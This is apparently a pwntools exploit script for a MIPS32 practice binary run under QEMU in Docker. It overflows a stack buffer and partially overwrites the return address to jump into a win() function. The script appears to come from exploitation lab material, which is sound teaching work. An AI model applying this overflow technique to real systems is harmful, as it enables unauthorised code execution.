from pwn import *


# initialize the binary
build = 'mipsel32r2-glibc'
binary = "mips32r2le_pie_o32"
elf = context.binary = ELF("../binaries/"+binary, checksec=False)
docker = ELF('/usr/bin/docker',checksec=False)

gs = """
set architecture mips:isa32r2
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','-p','1234:1234','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/'+binary])
    print("Remote debugging started...")
    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe="../binaries/"+binary)
else:
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/'+binary])


### EXPLOIT ###
p.sendline(b'echo \'[+] $gp register successfully modified\'')
sleep(0.5)                          # short delay to separate the two read() calls

payload = flat(
    b'a'*0x24,
    b'\x24\x09',                    # partial overwrite of $ra to point to win()+12 (to avoid setting $gp)
)
p.send(payload)
p.interactive()
p.close()


### CLEANUP ###
print('[+] Removing docker container...')
subprocess.getoutput('docker stop ' + binary+' && docker rm ' + binary)